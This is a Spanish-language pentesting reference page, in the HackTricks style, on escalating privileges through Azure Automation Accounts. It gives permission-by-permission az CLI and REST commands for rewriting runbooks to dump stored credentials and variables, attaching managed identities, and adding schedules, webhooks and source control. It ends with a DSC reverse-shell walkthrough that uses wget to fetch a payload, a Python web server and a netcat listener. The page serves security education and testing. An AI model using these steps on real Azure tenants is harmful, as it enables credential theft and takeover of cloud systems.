# Az - Azure Automation Accounts Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Azure Automation Accounts

Para más información, consulta:

{{#ref}}
../az-services/az-automation-accounts.md
{{#endref}}

### Grupo de Trabajadores Híbridos

Recuerda que si de alguna manera un atacante puede ejecutar un runbook arbitrario (código arbitrario) en un trabajador híbrido, él **se moverá a la ubicación de la VM**. Esto podría ser una máquina local, un VPC de otra nube o incluso una VM de Azure.

Además, si el trabajador híbrido se está ejecutando en Azure con otras Identidades Administradas adjuntas, el runbook podrá acceder a la **identidad administrada del runbook y todas las identidades administradas de la VM desde el servicio de metadatos**.

> [!TIP]
> Recuerda que el **servicio de metadatos** tiene una URL diferente (**`http://169.254.169.254`**) que el servicio desde donde se obtiene el token de identidades administradas de la cuenta de automatización (**`IDENTITY_ENDPOINT`**).

### `Microsoft.Automation/automationAccounts/jobs/write`, `Microsoft.Automation/automationAccounts/runbooks/draft/write`, `Microsoft.Automation/automationAccounts/jobs/output/read`, `Microsoft.Automation/automationAccounts/runbooks/publish/action` (`Microsoft.Resources/subscriptions/resourcegroups/read`, `Microsoft.Automation/automationAccounts/runbooks/write`)

En resumen, estos permisos permiten **crear, modificar y ejecutar Runbooks** en la Cuenta de Automatización, que podrías usar para **ejecutar código** en el contexto de la Cuenta de Automatización y escalar privilegios a las **Identidades Administradas** asignadas y filtrar **credenciales** y **variables encriptadas** almacenadas en la Cuenta de Automatización.

El permiso **`Microsoft.Automation/automationAccounts/runbooks/draft/write`** permite modificar el código de un Runbook en la Cuenta de Automatización usando:
```bash
# Update the runbook content with the provided PowerShell script
az automation runbook replace-content --no-wait \
--resource-group Resource_Group_1 \
--automation-account-name autoaccount1 \
--name AzureAutomationTutorialWithIdentity \
--content '$creds = Get-AutomationPSCredential -Name "<credential-name>"
$runbook_variable = Get-AutomationVariable -Name "<encrypted-variable-name>"
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password'
```
Nota cómo el script anterior puede ser utilizado para **leak the useranmd and password** de una credencial y el valor de una **encrypted variable** almacenada en la Automation Account.

El permiso **`Microsoft.Automation/automationAccounts/runbooks/publish/action`** permite al usuario publicar un Runbook en la Automation Account para que los cambios se apliquen:
```bash
az automation runbook publish \
--resource-group <res-group> \
--automation-account-name <account-name> \
--name <runbook-name>
```
El permiso **`Microsoft.Automation/automationAccounts/jobs/write`** permite al usuario ejecutar un Runbook en la Cuenta de Automatización utilizando:
```bash
az automation runbook start \
--automation-account-name <account-name> \
--resource-group <res-group> \
--name <runbook-name> \
[--run-on <name-hybrid-group>]
```
El permiso **`Microsoft.Automation/automationAccounts/jobs/output/read`** permite al usuario leer la salida de un trabajo en la Cuenta de Automatización utilizando:
```bash
az rest --method GET \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>/jobs/<job-name>/output?api-version=2023-11-01"
```
Si no hay Runbooks creados, o si deseas crear uno nuevo, necesitarás los **permisos `Microsoft.Resources/subscriptions/resourcegroups/read` y `Microsoft.Automation/automationAccounts/runbooks/write`** para hacerlo usando:
```bash
az automation runbook create --automation-account-name <account-name> --resource-group <res-group> --name <runbook-name> --type PowerShell
```
### `Microsoft.Automation/automationAccounts/write`, `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`

Este permiso permite al usuario **asignar una identidad administrada por el usuario** a la Cuenta de Automatización usando:
```bash
az rest --method PATCH \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>?api-version=2020-01-13-preview" \
--headers "Content-Type=application/json" \
--body '{
"identity": {
"type": "UserAssigned",
"userAssignedIdentities": {
"/subscriptions/<subscripntion-id>/resourceGroups/<res-group>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<user-managed-identity-name>": {}
}
}
}'
```
### `Microsoft.Automation/automationAccounts/schedules/write`, `Microsoft.Automation/automationAccounts/jobSchedules/write`

Con el permiso **`Microsoft.Automation/automationAccounts/schedules/write`** es posible crear un nuevo Schedule en la Automation Account que se ejecuta cada 15 minutos (no muy sigiloso) utilizando el siguiente comando.

Tenga en cuenta que el **intervalo mínimo para un schedule es de 15 minutos**, y el **tiempo de inicio mínimo es de 5 minutos** en el futuro.
```bash
## For linux
az automation schedule create \
--resource-group <RESOURCE_GROUP> \
--automation-account-name <AUTOMATION_ACCOUNT_NAME> \
--name <SCHEDULE_NAME> \
--description "Triggers runbook every minute" \
--start-time "$(date -u -d "7 minutes" +%Y-%m-%dT%H:%M:%SZ)" \
--frequency Minute \
--interval 15

## Form macOS
az automation schedule create \
--resource-group <RESOURCE_GROUP> \
--automation-account-name <AUTOMATION_ACCOUNT_NAME> \
--name <SCHEDULE_NAME> \
--description "Triggers runbook every 15 minutes" \
--start-time "$(date -u -v+7M +%Y-%m-%dT%H:%M:%SZ)" \
--frequency Minute \
--interval 15
```
Luego, con el permiso **`Microsoft.Automation/automationAccounts/jobSchedules/write`** es posible asignar un Scheduler a un runbook usando:
```bash
az rest --method PUT \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-accounts>/jobSchedules/b510808a-8fdc-4509-a115-12cfc3a2ad0d?api-version=2015-10-31" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"runOn": "",
"runbook": {
"name": "<runbook-name>"
},
"schedule": {
"name": "<scheduler-name>>"
},
"parameters": {}
}
}'
```
> [!TIP]
> En el ejemplo anterior, el id del jobchedule se dejó como **`b510808a-8fdc-4509-a115-12cfc3a2ad0d` como ejemplo** pero necesitarás usar un valor arbitrario para crear esta asignación.

### `Microsoft.Automation/automationAccounts/webhooks/write`

Con el permiso **`Microsoft.Automation/automationAccounts/webhooks/write`** es posible crear un nuevo Webhook para un Runbook dentro de una Cuenta de Automatización utilizando el siguiente comando.

Ten en cuenta que necesitarás **indicar la URI del webhook** con el token a utilizar.
```bash
az rest --method PUT \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automantion-account-name>/webhooks/<webhook-name>?api-version=2018-06-30" \
--body '{
"name": "<webhook-name>",
"properties": {
"isEnabled": true,
"expiryTime": "2026-01-09T20:03:30.291Z",
"parameters": {},
"runOn": null,
"runbook": {
"name": "<runbook-name>"
},
"uri": "https://f931b47b-18c8-45a2-9d6d-0211545d8c02.webhook.eus.azure-automation.net/webhooks?token=Ts5WmbKk0zcuA8PEUD4pr%2f6SM0NWydiCDqCqS1IdzIU%3d"
}
}'

# Then, to call the runbook using the webhook
curl -X POST "https://f931b47b-18c8-45a2-9d6d-0211545d8c02.webhook.eus.azure-automation.net/webhooks?token=Ts5WmbKk0zcuA8PEUD4pr%2f6SM0NWydiCDqCqS1IdzIU%3d" \
-H "Content-Length: 0"
```
### `Microsoft.Automation/automationAccounts/runbooks/draft/write`

Solo con el permiso `Microsoft.Automation/automationAccounts/runbooks/draft/write` es posible **actualizar el código de un Runbook** sin publicarlo y ejecutarlo utilizando los siguientes comandos.
```bash
# Update the runbook content with the provided PowerShell script
az automation runbook replace-content --no-wait \
--resource-group Resource_Group_1 \
--automation-account-name autoaccount1 \
--name AzureAutomationTutorialWithIdentity \
--content 'echo "Hello World"'

# Run the unpublished code
## Indicate the name of the hybrid worker group in runOn to execute the runbook there
az rest \
--method PUT \
--url "https://management.azure.com/subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Automation/automationAccounts/autoaccount1/runbooks/AzureAutomationTutorialWithIdentity/draft/testJob?api-version=2023-05-15-preview" \
--headers "Content-Type=application/json" \
--body '{
"parameters": {},
"runOn": "",
"runtimeEnvironment": "PowerShell-5.1"
}'

# Get the output (a different permission is needed here, but you could get a revershell or exfiltrate the token to avoid needing this permission)
az rest --method get --url "https://management.azure.com/subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Automation/automationAccounts/autoaccount1/runbooks/AzureAutomationTutorialWithIdentity/draft/testJob/streams?api-version=2019-06-01"
```
### `Microsoft.Automation/automationAccounts/sourceControls/write`, (`Microsoft.Automation/automationAccounts/sourceControls/read`)

Este permiso permite al usuario **configurar un control de fuente** para la Cuenta de Automatización utilizando comandos como el siguiente (esto utiliza Github como ejemplo):
```bash
az automation source-control create \
--resource-group <res-group> \
--automation-account-name <automation-account-name> \
--name RemoteGithub \
--repo-url https://github.com/carlospolop/gh-runbooks.git \
--branch main \
--folder-path /runbooks/ \
--publish-runbook true \
--auto-sync \
--source-type GitHub \
--token-type PersonalAccessToken \
--access-token github_pat_11AEDCVZ<rest-of-the-token>
```
Esto importará automáticamente los runbooks del repositorio de Github a la Automation Account y con algunos otros permisos para comenzar a ejecutarlos sería **posible escalar privilegios**.

Además, recuerda que para que el control de versiones funcione en las Automation Accounts debe tener una identidad administrada con el rol **`Contributor`** y si es una identidad administrada por el usuario, el id del cliente de la MI debe especificarse en la variable **`AUTOMATION_SC_USER_ASSIGNED_IDENTITY_ID`**.

> [!TIP]
> Ten en cuenta que no es posible cambiar la URL del repositorio de un control de versiones una vez que se ha creado.

### `Microsoft.Automation/automationAccounts/variables/write`

Con el permiso **`Microsoft.Automation/automationAccounts/variables/write`** es posible escribir variables en la Automation Account utilizando el siguiente comando.
```bash
az rest --method PUT \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>/variables/<variable-name>?api-version=2019-06-01" \
--headers "Content-Type=application/json" \
--body '{
"name": "<variable-name>",
"properties": {
"description": "",
"value": "\"<variable-value>\"",
"isEncrypted": false
}
}'
```
### Entornos de Ejecución Personalizados

Si una cuenta de automatización está utilizando un entorno de ejecución personalizado, podría ser posible sobrescribir un paquete personalizado del entorno con algún código malicioso (como **una puerta trasera**). De esta manera, cada vez que se ejecute un runbook que utilice ese entorno personalizado y cargue el paquete personalizado, se ejecutará el código malicioso.

### Compromiso de la Configuración de Estado

**Consulta la publicación completa en:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

- Paso 1 — Crear Archivos

**Archivos Requeridos:** Se necesitan dos scripts de PowerShell:
1. `reverse_shell_config.ps1`: Un archivo de Configuración de Estado Deseado (DSC) que obtiene y ejecuta la carga útil. Se puede obtener de [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1).
2. `push_reverse_shell_config.ps1`: Un script para publicar la configuración en la VM, disponible en [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1).

**Personalización:** Las variables y parámetros en estos archivos deben adaptarse al entorno específico del usuario, incluidos los nombres de recursos, rutas de archivos e identificadores de servidor/carga útil.

- Paso 2 — Comprimir el Archivo de Configuración

El `reverse_shell_config.ps1` se comprime en un archivo `.zip`, preparándolo para su transferencia a la Cuenta de Almacenamiento de Azure.
```bash
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
- Paso 3 — Establecer contexto de almacenamiento y cargar

El archivo de configuración comprimido se carga en un contenedor de almacenamiento de Azure predefinido, azure-pentest, utilizando el cmdlet Set-AzStorageBlobContent de Azure.
```bash
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
- Paso 4 — Preparar Kali Box

El servidor Kali descarga la carga útil RevPS.ps1 de un repositorio de GitHub.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
El script se edita para especificar la VM de Windows objetivo y el puerto para el shell inverso.

- Paso 5 — Publicar archivo de configuración

El archivo de configuración se ejecuta, lo que resulta en que el script de shell inverso se despliega en la ubicación especificada en la VM de Windows.

- Paso 6 — Alojar carga útil y configurar el oyente

Se inicia un Python SimpleHTTPServer para alojar la carga útil, junto con un oyente de Netcat para capturar conexiones entrantes.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
La tarea programada ejecuta la carga útil, logrando privilegios a nivel de SYSTEM.

{{#include ../../../banners/hacktricks-training.md}}
